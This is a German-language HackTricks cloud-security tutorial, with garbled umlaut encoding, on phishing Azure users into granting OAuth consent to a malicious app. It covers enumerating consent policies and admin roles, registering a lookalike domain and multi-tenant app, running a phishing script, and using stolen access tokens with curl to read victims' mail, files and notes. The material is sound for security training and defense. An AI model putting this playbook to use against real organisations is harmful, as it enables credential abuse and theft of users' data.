# Az - OAuth Apps Phishing

{% hint style="success" %}
Lerne & √ºbe AWS Hacking:<img src="../../../.gitbook/assets/image (1) (1) (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1) (1) (1) (1).png" alt="" data-size="line">\
Lerne & √ºbe GCP Hacking: <img src="../../../.gitbook/assets/image (2) (1).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2) (1).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* √úberpr√ºfe die [**Abonnementpl√§ne**](https://github.com/sponsors/carlospolop)!
* **Tritt der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folge** uns auf **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Teile Hacking-Tricks, indem du PRs zu den** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos einreichst.

</details>
{% endhint %}

## OAuth App Phishing

**Azure-Anwendungen** sind mit den Berechtigungen konfiguriert, die sie verwenden k√∂nnen, wenn ein Benutzer der Anwendung zustimmt (wie das Auflisten des Verzeichnisses, den Zugriff auf Dateien oder das Ausf√ºhren anderer Aktionen). Beachte, dass die Anwendung im Namen des Benutzers handelt, sodass die App **keine administrativen Aktionen ausf√ºhren kann**, wenn der **Benutzer, der zustimmt, diese Berechtigung nicht hat**.

### App-Zustimmungsberechtigungen

Standardm√§√üig kann jeder **Benutzer Apps zustimmen**, obwohl dies so konfiguriert werden kann, dass Benutzer nur **Apps von verifizierten Herausgebern f√ºr ausgew√§hlte Berechtigungen** zustimmen k√∂nnen oder sogar **die Berechtigung** f√ºr Benutzer entfernt wird, Anwendungen zuzustimmen.

<figure><img src="../../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>

Wenn Benutzer nicht zustimmen k√∂nnen, k√∂nnen **Administratoren** wie `GA`, `Application Administrator` oder `Cloud Application` `Administrator` die **Zustimmung f√ºr die Anwendungen** erteilen, die Benutzer verwenden k√∂nnen.

Dar√ºber hinaus, wenn Benutzer nur f√ºr Apps mit **geringem Risiko** zustimmen k√∂nnen, sind diese Berechtigungen standardm√§√üig **openid**, **profile**, **email**, **User.Read** und **offline\_access**, obwohl es m√∂glich ist, **weitere** zu dieser Liste hinzuzuf√ºgen.

Und wenn sie allen Apps zustimmen k√∂nnen, k√∂nnen sie allen Apps zustimmen.

### 2 Arten von Angriffen

* **Unauthentifiziert**: Erstelle von einem externen Konto eine Anwendung mit den **geringf√ºgigen Berechtigungen** `User.Read` und `User.ReadBasic.All`, phish einen Benutzer, und du wirst in der Lage sein, auf Verzeichnisinformationen zuzugreifen.
* Dies erfordert, dass der phished Benutzer **in der Lage ist, OAuth-Apps von externen Mandanten zu akzeptieren**.
* Wenn der phished Benutzer ein Administrator ist, der **jeder App mit beliebigen Berechtigungen zustimmen kann**, k√∂nnte die Anwendung auch **privilegierte Berechtigungen anfordern**.
* **Authentifiziert**: Nachdem du einen Principal mit ausreichenden Berechtigungen kompromittiert hast, **erstelle eine Anwendung im Konto** und **phish** einen **privilegierten** Benutzer, der privilegierte OAuth-Berechtigungen akzeptieren kann.
* In diesem Fall kannst du bereits auf die Informationen des Verzeichnisses zugreifen, sodass die Berechtigung `User.ReadBasic.All` nicht mehr interessant ist.
* Du bist wahrscheinlich an **Berechtigungen interessiert, die ein Administrator gew√§hren muss**, da normale Benutzer OAuth-Apps keine Berechtigungen erteilen k√∂nnen, weshalb du **nur diese Benutzer phishen musst** (mehr dazu, welche Rollen/Berechtigungen dieses Privileg gew√§hren, sp√§ter).

### Benutzer d√ºrfen zustimmen

Beachte, dass du diesen Befehl von einem Benutzer innerhalb des Mandanten ausf√ºhren musst, du kannst diese Konfiguration eines Mandanten nicht von einem externen finden. Der folgende CLI kann dir helfen, die Berechtigungen der Benutzer zu verstehen:

{% code overflow="wrap" %}
```bash
az rest --method GET --url "https://graph.microsoft.com/v1.0/policies/authorizationPolicy"
```
{% endcode %}

* Benutzer k√∂nnen allen Apps zustimmen: Wenn Sie in **`permissionGrantPoliciesAssigned`** finden: `ManagePermissionGrantsForSelf.microsoft-user-default-legacy`, dann k√∂nnen Benutzer jede Anwendung akzeptieren.
* Benutzer k√∂nnen Apps von verifizierten Herausgebern oder Ihrer Organisation zustimmen, jedoch nur f√ºr die von Ihnen ausgew√§hlten Berechtigungen: Wenn Sie in **`permissionGrantPoliciesAssigned`** finden: `ManagePermissionGrantsForOwnedResource.microsoft-dynamically-managed-permissions-for-team`, dann k√∂nnen Benutzer jede Anwendung akzeptieren.
* **Benutzerzustimmung deaktivieren**: Wenn Sie in **`permissionGrantPoliciesAssigned`** nur finden: `ManagePermissionGrantsForOwnedResource.microsoft-dynamically-managed-permissions-for-chat` und `ManagePermissionGrantsForOwnedResource.microsoft-dynamically-managed-permissions-for-team`, dann k√∂nnen Benutzer nicht zustimmen.

Es ist m√∂glich, die Bedeutung jeder der kommentierten Richtlinien zu finden in:

{% code overflow="wrap" %}
```bash
az rest --method GET --url "https://graph.microsoft.com/v1.0/policies/permissionGrantPolicies"
```
{% endcode %}

### **Anwendungsadministratoren**

√úberpr√ºfen Sie die Benutzer, die als Anwendungsadministratoren gelten (k√∂nnen neue Anwendungen akzeptieren):

{% code overflow="wrap" %}
```bash
# Get list of roles
az rest --method GET --url "https://graph.microsoft.com/v1.0/directoryRoles"

# Get Global Administrators
az rest --method GET --url "https://graph.microsoft.com/v1.0/directoryRoles/1b2256f9-46c1-4fc2-a125-5b2f51bb43b7/members"

# Get Application Administrators
az rest --method GET --url "https://graph.microsoft.com/v1.0/directoryRoles/1e92c3b7-2363-4826-93a6-7f7a5b53e7f9/members"

# Get Cloud Applications Administrators
az rest --method GET --url "https://graph.microsoft.com/v1.0/directoryRoles/0d601d27-7b9c-476f-8134-8e7cd6744f02/members"
```
{% endcode %}

## **Angriffsfluss √úbersicht**

Der Angriff umfasst mehrere Schritte, die auf ein generisches Unternehmen abzielen. So k√∂nnte es ablaufen:

1. **Domainregistrierung und Anwendungs-Hosting**: Der Angreifer registriert eine Domain, die einer vertrauensw√ºrdigen Seite √§hnelt, zum Beispiel "safedomainlogin.com". Unter dieser Domain wird eine Subdomain erstellt (z. B. "companyname.safedomainlogin.com"), um eine Anwendung zu hosten, die darauf ausgelegt ist, Autorisierungscodes zu erfassen und Zugriffstoken anzufordern.
2. **Anwendungsregistrierung in Azure AD**: Der Angreifer registriert dann eine Multi-Tenant-Anwendung in seinem Azure AD-Mandanten und benennt sie nach dem Zielunternehmen, um legitim zu erscheinen. Er konfiguriert die Redirect-URL der Anwendung so, dass sie auf die Subdomain verweist, die die b√∂sartige Anwendung hostet.
3. **Einrichten von Berechtigungen**: Der Angreifer richtet die Anwendung mit verschiedenen API-Berechtigungen ein (z. B. `Mail.Read`, `Notes.Read.All`, `Files.ReadWrite.All`, `User.ReadBasic.All`, `User.Read`). Diese Berechtigungen erm√∂glichen es dem Angreifer, sensible Informationen im Namen des Benutzers zu extrahieren, sobald sie vom Benutzer gew√§hrt werden.
4. **Verbreitung b√∂sartiger Links**: Der Angreifer erstellt einen Link, der die Client-ID der b√∂sartigen Anwendung enth√§lt, und teilt ihn mit gezielten Benutzern, um sie zu t√§uschen und zur Zustimmung zu bewegen.

## Beispielangriff

1. Registrieren Sie eine **neue Anwendung**. Sie kann nur f√ºr das aktuelle Verzeichnis sein, wenn Sie einen Benutzer aus dem angegriffenen Verzeichnis verwenden, oder f√ºr jedes Verzeichnis, wenn es sich um einen externen Angriff handelt (wie im folgenden Bild).
1. Setzen Sie auch die **Redirect-URI** auf die erwartete URL, an der Sie den Code zum Abrufen der Token erhalten m√∂chten (`http://localhost:8000/callback` standardm√§√üig).

<figure><img src="../../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

2. Erstellen Sie dann ein Anwendungsgeheimnis:

<figure><img src="../../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

3. W√§hlen Sie API-Berechtigungen aus (z. B. `Mail.Read`, `Notes.Read.All`, `Files.ReadWrite.All`, `User.ReadBasic.All`, `User.Read`)

<figure><img src="../../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

4. **F√ºhren Sie die Webseite (**[**azure\_oauth\_phishing\_example**](https://github.com/carlospolop/azure_oauth_phishing_example)**)** aus, die nach den Berechtigungen fragt:

{% code overflow="wrap" %}
```bash
# From https://github.com/carlospolop/azure_oauth_phishing_example
python3 azure_oauth_phishing_example.py --client-secret <client-secret> --client-id <client-id> --scopes "email,Files.ReadWrite.All,Mail.Read,Notes.Read.All,offline_access,openid,profile,User.Read"
```
{% endcode %}

5. **Senden Sie die URL an das Opfer**
1. In diesem Fall `http://localhost:8000`
6. **Opfer** m√ºssen **die Aufforderung akzeptieren:**

<figure><img src="../../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>

7. Verwenden Sie das **Zugriffstoken, um auf die angeforderten Berechtigungen zuzugreifen**:
```bash
export ACCESS_TOKEN=<ACCESS_TOKEN>

# List drive files
curl -X GET \
https://graph.microsoft.com/v1.0/me/drive/root/children \
-H "Authorization: Bearer $ACCESS_TOKEN" \
-H "Accept: application/json"

# List eails
curl -X GET \
https://graph.microsoft.com/v1.0/me/messages \
-H "Authorization: Bearer $ACCESS_TOKEN" \
-H "Accept: application/json"

# List notes
curl -X GET \
https://graph.microsoft.com/v1.0/me/onenote/notebooks \
-H "Authorization: Bearer $ACCESS_TOKEN" \
-H "Accept: application/json"
```
## Andere Werkzeuge

* [**365-Stealer**](https://github.com/AlteredSecurity/365-Stealer)**:** √úberpr√ºfen Sie [https://www.alteredsecurity.com/post/introduction-to-365-stealer](https://www.alteredsecurity.com/post/introduction-to-365-stealer), um zu erfahren, wie Sie es konfigurieren.
* [**O365-Attack-Toolkit**](https://github.com/mdsecactivebreach/o365-attack-toolkit)

## Post-Exploitation

### Phishing Post-Exploitation

Je nach den angeforderten Berechtigungen k√∂nnten Sie in der Lage sein, **auf verschiedene Daten des Mandanten** (Benutzer, Gruppen... oder sogar Einstellungen zu √§ndern) und **Informationen des Benutzers** (Dateien, Notizen, E-Mails...) zuzugreifen. Dann k√∂nnen Sie diese Berechtigungen nutzen, um diese Aktionen durchzuf√ºhren.

### Anwendung Post-Exploitation

√úberpr√ºfen Sie die Abschnitte Anwendungen und Dienstprinzipal der Seite:

{% content-ref url="../az-privilege-escalation/az-entraid-privesc/" %}
[az-entraid-privesc](../az-privilege-escalation/az-entraid-privesc/)
{% endcontent-ref %}

## Referenzen

* [https://www.alteredsecurity.com/post/introduction-to-365-stealer](https://www.alteredsecurity.com/post/introduction-to-365-stealer)
* [https://swisskyrepo.github.io/InternalAllTheThings/cloud/azure/azure-phishing/](https://swisskyrepo.github.io/InternalAllTheThings/cloud/azure/azure-phishing/)

{% hint style="success" %}
Lernen & √ºben Sie AWS Hacking:<img src="../../../.gitbook/assets/image (1) (1) (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1) (1) (1) (1).png" alt="" data-size="line">\
Lernen & √ºben Sie GCP Hacking: <img src="../../../.gitbook/assets/image (2) (1).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2) (1).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Unterst√ºtzen Sie HackTricks</summary>

* √úberpr√ºfen Sie die [**Abonnementpl√§ne**](https://github.com/sponsors/carlospolop)!
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos senden.

</details>
{% endhint %}
